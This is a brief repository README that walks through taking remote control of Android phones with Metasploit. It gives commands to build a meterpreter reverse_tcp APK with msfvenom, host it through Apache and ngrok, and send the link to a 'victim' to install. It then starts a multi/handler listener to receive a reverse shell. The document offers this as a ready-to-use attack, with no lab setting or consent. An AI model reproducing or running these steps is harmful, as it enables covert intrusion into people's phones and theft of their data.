# adnroid_hacking
hi guys in this repo i will how you how to access any android devices with the help of msf payload. :)
use msf payload 

step1)  sudo service postgresql start
step2)  msfconsole 
step3) msfvenom -p android/meterpreter/reverse_tcp lhost={local ip} lport={any port} R> hack.apk
step4) now cp payload in html folder  cp /var/www/html
step5) run apache server    sudo service apache2 start
step6) now start your ngrok server   ./ngrok http 80

step7) copy ngrok link send to victim mobile download nd install ;)

step8) start listner  use exploit/multi/handler
step9) set payload android/meterpreter/reverse_tcp
step10) set lhost={your local machine ip address }
step11)  set lport={your payload port}
step12)  exploit -j 


now install payload and open to successfully get your reverse shell :)


